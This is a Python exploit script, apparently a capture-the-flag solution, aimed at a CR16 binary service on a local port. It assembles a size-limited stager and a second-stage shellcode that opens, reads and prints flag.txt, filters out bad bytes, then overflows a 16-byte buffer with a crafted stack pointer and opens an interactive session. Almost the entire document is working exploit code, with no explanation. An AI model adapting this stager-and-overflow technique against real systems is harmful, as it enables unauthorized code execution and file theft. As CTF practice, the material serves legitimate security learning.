stager_asm = '''.section .text
.global _start
.ascii "%s"
_start:
# 1482:	00 50       	cmpb	$0x0:s,r0
    movw $0x1480, ra
    # use default r3
    storw r3, 0x2:s(ra)
# 00001400 <_start>:
    # hex(0x1480^(0x1400/2)) == 0x1e80
    xorw $0x1e80, ra
    push ra
    popret ra
.ascii "%s"
'''
asm = '''.section .text
.global _start
.ascii "%s"
_start:
start:
    bal (ra), 4
    lshw $1, ra
    addw $46, ra
open:
    # arg0 == r3, r2
    xorw r3, r3
    movw ra, r2
    xorw r4, r4
    xorw r5, r5
    movw	$2:s, r0
    excp	8
read:
    movw r0, r2
    xorw r4, r4
    movw ra, r3
    movw    $0x7f:s,r5
    movw	$4:s, r0
    excp	8
write:
    movw $1, r2
    xorw r4, r4
    movw ra, r3
    movw    $0x7f:s,r5
    movw	$5:s, r0
    excp	8
.ascii "%s"
'''

import os
from lib.mylib import *

ARCH = 'cr16'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'
BUF_SIZE = 16

stager_asm = stager_asm % (BEGIN_MARKER, END_MARKER)
asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/b.S', mode='wb').write(stager_asm)
os.system(AS + ' /tmp/b.S -o /tmp/b.out')
exe = open('/tmp/b.out').read()
stager = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
xxd(stager)
if '\x00' in stager:
    raise Exception('has \\x00')
if '\x0a' in stager:
    raise Exception('has \\x0a')
if len(stager) > BUF_SIZE:
    raise Exception('too long')
stager = stager.ljust(BUF_SIZE, 'A')

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10015
s = mysock(IP, PORT)

SP = p(0x1afc / 2)
sl(s, '\n000')
first = stager + SP[0:2] + '\n'
sl(s, first)

SP = p((0x1afc + 16 + 4) / 2)
sl(s, '\n000')
shellcode = 'A' * BUF_SIZE + SP + shellcode + '\n'
sl(s, shellcode)
shell(s)
